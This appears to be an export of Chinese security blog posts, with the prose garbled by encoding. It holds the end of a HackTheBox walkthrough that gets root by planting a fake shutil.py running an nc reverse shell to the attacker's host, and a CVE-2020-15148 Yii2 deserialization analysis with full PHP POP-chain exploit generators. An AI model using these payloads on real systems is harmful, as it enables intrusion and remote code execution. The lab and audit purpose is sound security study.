<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> shutil <span class="keyword">import</span> make_archive</span><br><span class="line"></span><br><span class="line">src = <span class="string">&#x27;/var/www/html/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># old ftp directory, not used anymore</span></span><br><span class="line"><span class="comment">#dst = &#x27;/srv/ftp/html&#x27;</span></span><br><span class="line"></span><br><span class="line">dst = <span class="string">&#x27;/var/backups/html&#x27;</span></span><br><span class="line"></span><br><span class="line">make_archive(dst, <span class="string">&#x27;gztar&#x27;</span>, src)</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå¼•ç”¨äº†shutilæ¨¡å—ä¸­çš„<code>make_archive</code>å‡½æ•°ï¼Œè¿™ä¸ªåœ°æ–¹å¾—ç”¨Pythonåº“åŠ«æŒçš„æ–¹æ³•ææƒï¼š</p>
<blockquote>
<p><a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">https://rastating.github.io/privilege-escalation-via-python-library-hijacking/</a></p>
</blockquote>
<p>æŸ¥çœ‹å½“å‰Pythonåº“çš„è·¯å¾„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">waldo@admirer:&#x2F;opt&#x2F;scripts$ python3 -c &#39;import sys; print (&quot;\n&quot;.join(sys.path))&#39;</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python35.zip</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python3.5</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python3.5&#x2F;plat-x86_64-linux-gnu</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python3.5&#x2F;lib-dynload</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.5&#x2F;dist-packages</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯æˆ‘ä»¬éƒ½æ²¡æœ‰æƒé™å†™å…¥æ–‡ä»¶åˆ°è¿™äº›è·¯å¾„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>PYTHONPATH</code>æ¥ä¸´æ—¶æ›´æ”¹Pythonåº“çš„è·¯å¾„</p>
<p>é¦–å…ˆä¼ªé€ ä¸€ä¸ªshutil.pyåº“æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">waldo@admirer:&#x2F;opt&#x2F;scripts$ cd</span><br><span class="line">waldo@admirer:~$ mkdir fakelib</span><br><span class="line">waldo@admirer:~$ cd fakelib&#x2F;</span><br><span class="line">waldo@admirer:~&#x2F;fakelib$ nano shutil.py </span><br><span class="line">waldo@admirer:~&#x2F;fakelib$ cat shutil.py </span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def make_archive(a, b, c):</span><br><span class="line">    os.system(&quot;nc 10.10.14.4 1234 -e &#39;&#x2F;bin&#x2F;sh&#39;&quot;)</span><br></pre></td></tr></table></figure>
<p>é¶æœºè¿è¡Œè„šæœ¬æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">waldo@admirer:~/fakelib$ sudo PYTHONPATH=~/fakelib /opt/scripts/admin_tasks.sh </span><br><span class="line">[sudo] password <span class="keyword">for</span> waldo: </span><br><span class="line"></span><br><span class="line">[[[ System Administration Menu ]]]</span><br><span class="line">1) View system uptime</span><br><span class="line">2) View logged <span class="keyword">in</span> users</span><br><span class="line">3) View crontab</span><br><span class="line">4) Backup passwd file</span><br><span class="line">5) Backup shadow file</span><br><span class="line">6) Backup web data</span><br><span class="line">7) Backup DB</span><br><span class="line">8) Quit</span><br><span class="line">Choose an option: 6</span><br><span class="line">Running backup script <span class="keyword">in</span> the background, it might take a <span class="keyword">while</span>...</span><br></pre></td></tr></table></figure>
<p>æœ¬æœºä¸Šç›‘å¬1234ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc -lvnp 1234</span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [10.10.14.4] from (UNKNOWN) [10.10.10.187] 58946</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">root@admirer:&#x2F;home&#x2F;waldo&#x2F;fakelib# id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@admirer:&#x2F;home&#x2F;waldo&#x2F;fakelib# cd   </span><br><span class="line">cd</span><br><span class="line">root@admirer:~# cat root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">c6af------------------------4645</span><br></pre></td></tr></table></figure>
<p>ROOTEDï¼ï¼ï¼</p>
<h2 id="0x04-Summary">0x04 Summary</h2>
<ul>
<li>nmapæ‰«æå‡º <code>admin-dir</code>ç›®å½•ï¼Œè®¿é—®å‘ç°403 Forbidden</li>
<li>ä½¿ç”¨wfuzzå·¥å…·æ‰«æå‡º <code>contacts.txt</code> å’Œ<code>credentials.txt</code>ä¸¤ä¸ªæ–‡ä»¶</li>
<li>ç”¨<code>credentials.txt</code>æ–‡ä»¶æš´éœ²å‡ºæ¥çš„FTPç”¨æˆ·åå’Œå¯†ç ç™»å½•é¶æœºFTPæœåŠ¡</li>
<li>ä¸‹è½½<code>dump.sql</code>æ–‡ä»¶å’Œ<code>html.tar.gz</code>å¹¶è§£å‹</li>
<li><code>utility-scripts</code>ç›®å½•ä¸­æœ‰MySQLçš„ç™»å½•åå’Œå¯†ç </li>
<li>wfuzz<code>utility-scripts</code>ç›®å½•å‘ç° <code>adminer.php</code></li>
<li>ä¸Šé¢ç”¨æˆ·åå’Œå¯†ç ä¸èƒ½ç™»å½•adminer</li>
<li>Googleå‘ç°ä¸€ä¸ªadmineræ¼æ´çš„å…¬å¼€åˆ©ç”¨æ–¹å¼</li>
<li>åœ¨æœ¬åœ°è¿è¡ŒMySQLæœåŠ¡ï¼Œå¹¶ä¸”æ–°å»ºç”¨æˆ·å…è®¸ä»»æ„ä¸»æœºæ¥å…¥ï¼Œé…ç½®MySQLå¤–éƒ¨å¯è®¿é—®</li>
<li>ç”¨é¶æœºçš„admineræœåŠ¡è¿æ¥æœ¬åœ°æ•°æ®åº“</li>
<li>å°†index.phpå†™å…¥æœ¬åœ°æ•°æ®åº“</li>
<li>å¾—åˆ°waldoçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œç”¨SSHç™»å½•</li>
<li>æ‹¿åˆ°<code>user.txt</code></li>
<li>è¿è¡Œ<code>sudo -l</code>å‘½ä»¤ï¼ŒæŸ¥çœ‹æœ‰æƒé™æ‰§è¡Œçš„è„šæœ¬<code>admin_task.sh</code></li>
<li><code>admin_task.sh</code>ä¼šè°ƒç”¨<code>backup.py</code></li>
<li><code>Python</code> <strong>library</strong> <code>path</code> <strong>hijacking</strong> ææƒ</li>
<li>ä¼ªé€ <code>shutil.py</code>ï¼Œå†™å…¥reverse shell</li>
<li>sudoè¿è¡Œ<code>admin_task.sh</code>æ—¶æŒ‡å®š <code>PYTHONPATH</code></li>
<li>æ‹¿åˆ° <code>root.txt</code></li>
</ul>
<h2 id="0x05-Reference">0x05 Reference</h2>
<table>
<thead>
<tr>
<th>Topic</th>
<th>Url</th>
</tr>
</thead>
<tbody>
<tr>
<td>Adminer-database Manager</td>
<td><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a></td>
</tr>
<tr>
<td>Adminer-Database Manager</td>
<td><a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability">https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability</a></td>
</tr>
<tr>
<td>Configuration of Mysql</td>
<td><a href="https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql">https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql</a></td>
</tr>
<tr>
<td>Configuration of Mysql</td>
<td><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql">https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql</a></td>
</tr>
<tr>
<td>Python Path Hijacting</td>
<td><a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">https://rastating.github.io/privilege-escalation-via-python-library-hijacking/</a></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>Yii2ååºåˆ—åŒ–æ¼æ´åˆ†æåŠæ‹“å±•</title>
    <url>/code_audit/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/</url>
    <content><![CDATA[<h1 id="CVE-2020-15148-Yii2-ååºåˆ—åŒ–åˆ†æåŠæ‹“å±•">CVE-2020-15148 Yii2 ååºåˆ—åŒ–åˆ†æåŠæ‹“å±•</h1>
<h2 id="æ¼æ´èŒƒå›´">æ¼æ´èŒƒå›´</h2>
<ul>
<li>Yii2 &lt; 2.0.38</li>
</ul>
<h2 id="ç¯å¢ƒå®‰è£…">ç¯å¢ƒå®‰è£…</h2>
<p>è¿™é‡Œç›´æ¥é€‰æ‹©å»GitHubå®˜æ–¹ä»“åº“æ‹‰å–Yii2çš„æºä»£ç ï¼š</p>
<p><a href="https://github.com/yiisoft/yii2/releases">https://github.com/yiisoft/yii2/releases</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210340.png" alt=""></p>
<p>ä¸‹è½½åˆ°æœ¬åœ°åè§£å‹åˆ°webç›®å½•ï¼Œä¿®æ”¹<code>config/web.php</code>æ–‡ä»¶é‡Œ<code>cookieValidationKey</code>çš„å€¼</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210528.png" alt=""></p>
<p>å†åœ¨Controlleræ·»åŠ ä¸€ä¸ªååºåˆ—åŒ–çš„å…¥å£ä»£ç ï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210912.png" style="zoom:50%;" />
<p>MacOSä¸‹ç”¨MAMPæ­å»ºPHPè°ƒè¯•ç¯å¢ƒï¼Œæµ‹è¯•ä¸€ä¸‹ï¼š</p>
<blockquote>
<p>æ­å»ºæ•™ç¨‹ï¼š<a href="https://www.sqlsec.com/2020/07/macphp.html">https://www.sqlsec.com/2020/07/macphp.html</a></p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006211613.png" alt=""></p>
<p>éªŒè¯æˆåŠŸï¼Œå¼€å§‹å®¡è®¡ã€‚</p>
<h2 id="æ¼æ´åˆ†æ">æ¼æ´åˆ†æ</h2>
<p>æ ¹æ®ç°æœ‰çš„èµ„æ–™ï¼Œååºåˆ—åŒ–çš„èµ·ç‚¹æ˜¯åœ¨<code>yii\db\BatchQueryResult</code>ç±»ä¸­ï¼Œæ–‡ä»¶ä½ç½®<code>/vendor/yiisoft/yii2/db/BatchQueryResult.php</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007211913.png" alt=""></p>
<p><code>__destruct()</code>å‡½æ•°è°ƒç”¨äº†<code>reset()</code>æ–¹æ³•ï¼Œ<code>reset()</code>æ–¹æ³•ä¸­çš„<code>_dataReader</code>å‚æ•°æ˜¯å¯æ§çš„ï¼Œå¹¶ä¸”è°ƒç”¨äº†è¯¥å‚æ•°çš„<code>close()</code>å‡½æ•°ï¼Œé‚£ä¹ˆæ­¤å¤„å°±å¯ä»¥ä½œä¸ºè·³æ¿ï¼Œå»æ‰§è¡Œå…¶ä»–ç±»ä¸­çš„<code>__call()</code>å‡½æ•°ï¼Œå…¨å±€æŸ¥æ‰¾å…³é”®å­—<code>function __call</code>ï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224238.png" style="zoom:50%;" />
<p>ä¸€å…±æœ‰æ‰¾åˆ°16ä¸ª<code>__call()</code>å‡½æ•°ï¼Œé‚£å°±ä¸€ä¸ªä¸€ä¸ªçš„åˆ†æä¸‹æ¥ï¼Œå…¶ä¸­Codeceptionç»„ä»¶ä¸­å¤šæ•°æ˜¯ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œæ²¡æœ‰å¯åˆ©ç”¨çš„åœ°æ–¹ï¼Œä½†æ˜¯<code>Faker\Generator</code>ç±»æ˜¯å¯ä»¥æˆä¸ºPOPé“¾çš„ã€‚å…·ä½“ä»£ç ä½äºï¼š<code>/vendor/fzaninotto/faker/src/Faker/Generator.php</code></p>
<p>é¦–å…ˆ<code>__call()</code>å‡½æ•°ä¸­è°ƒç”¨äº†<code>format()</code>æ–¹æ³•ï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224606.png" style="zoom:50%;" />
<p>æ¥ç€è·Ÿä¸‹å»<code>format()</code>æ–¹æ³•ï¼Œå‚æ•°<code>$method</code>å’Œ<code>$attributes</code>éƒ½æ˜¯ä¸å¯æ§çš„ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224816.png" alt=""></p>
<p>åœ¨<code>format()</code>æ–¹æ³•å†…éƒ¨ï¼Œä½¿ç”¨å›è°ƒå‡½æ•°<code>call_user_func_array()</code>è°ƒç”¨äº†<code>getFormatter()</code>æ–¹æ³•ã€‚åœ¨è¯¥æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬åªå…³å¿ƒç¬¬ä¸€ä¸ªifè¯­å¥ï¼Œ</p>
<p>ç”±äº<code>$this-&gt;formatter</code>æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæ‰€ä»¥è¿™é‡Œå°±å¯ä»¥è°ƒç”¨ä»»æ„ç±»ä¸­çš„ä»»æ„æ–¹æ³•äº†ã€‚ä½†æ˜¯ä¸Šé¢æåˆ°è¿‡ï¼Œæ­¤æ—¶<code>$formatter='close'</code>è€Œ<code>$arguments</code>ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯è¯´<code>call_user_func_array()</code>è¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºç©ºã€‚è¯´çš„æ›´é€å½»ä¸€ç‚¹ï¼Œè¦å¯»æ‰¾çš„å°±æ˜¯å¯ä»¥å®ç°RCEçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•ï¼Œå¹¶ä¸”å‚æ•°æ˜¯ç±»çš„æˆå‘˜å˜é‡ï¼</p>
<p>åŒæ ·çš„ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨<code>call_user_func()</code>å»å®ç°RCEï¼Œç”¨æ­£åˆ™è¡¨è¾¾å¼<code>call_user_func(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)\)</code>å»åŒ¹é…å‚æ•°çš„é™åˆ¶ï¼Œå…¨å±€æœç´¢ï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007231112.png" style="zoom:50%;" />
<p><code>yii\rest\CreateAction::run()</code>å’Œ<code>yii\rest\IndexAction::run()</code>éƒ½å¯ä»¥å®ç°ä¸Šè¿°æ¡ä»¶ä¸‹çš„RCEï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007231243.png" alt=""></p>
<p>é‚£ä¹ˆæ•´ä¸ªPOPé“¾ä¹Ÿå°±æ¸…æ¥šäº†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\CreateAction::run()</span><br></pre></td></tr></table></figure>
<h2 id="ç¼–å†™EXP">ç¼–å†™EXP</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> BatchQueryResult()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»“æœï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007233404.png" alt=""></p>
<h2 id="ç»§ç»­æŒ–æ˜">ç»§ç»­æŒ–æ˜</h2>
<p>æ–°ç‰ˆæœ¬çš„<code>BatchQueryResult</code>ç±»å·²ç»æ— æ³•ååºåˆ—åŒ–äº†ï¼Œé‚£å°±å…¨å±€æœç´¢<code>__destruct()</code>å‡½æ•°ï¼Œç„¶åä¸€ä¸ªä¸ªçš„æ’æŸ¥ã€‚</p>
<h3 id="ç¬¬ä¸€æ¡POPé“¾">ç¬¬ä¸€æ¡POPé“¾</h3>
<p>è§¦å‘ç‚¹ä½äº<code>vendor\codeception\codeception\ext\RunProcess.php</code>ï¼ŒPOPé“¾å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Codeception\Extension\RunProcess::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
<p>EXPï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $process;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;process = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ç¬¬äºŒæ¡POPé“¾">ç¬¬äºŒæ¡POPé“¾</h3>
<p>è§¦å‘ç‚¹ä½äº<code>vendor\swiftmailer\lib\classes\Swift\KeyCache\DiskKeyCache.php</code>ï¼ŒPOPé“¾å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Tags\Deprecated.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
<p>EXPï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Deprecated</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">Deprecated</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $path;</span><br><span class="line">        <span class="keyword">private</span> $keys;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> Deprecated();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(<span class="string">&quot;just&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;for&quot;</span>=&gt;<span class="string">&quot;ca01h&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è™½ç„¶æŠ¥é”™ï¼Œä½†å‘½ä»¤è¿˜æ˜¯æˆåŠŸæ‰§è¡Œäº†ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008174414.png" alt=""></p>
<p>ä¸æ­¤ç±»ä¼¼çš„POPé“¾è¿˜æœ‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Tags\See.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
<p>ä»¥åŠ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Description.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
<h3 id="ç¬¬ä¸‰æ¡POPé“¾">ç¬¬ä¸‰æ¡POPé“¾</h3>
<blockquote>
<p>PHP &gt; 7.1</p>
</blockquote>
<p>å†æ¥ä¸€ä¸ªä»<code>__wakeup</code>å…¥æ‰‹çš„POPé“¾ï¼Œååºåˆ—åŒ–èµ·ç‚¹ä½äº<code>vendor\symfony\string\UnicodeString.php</code></p>
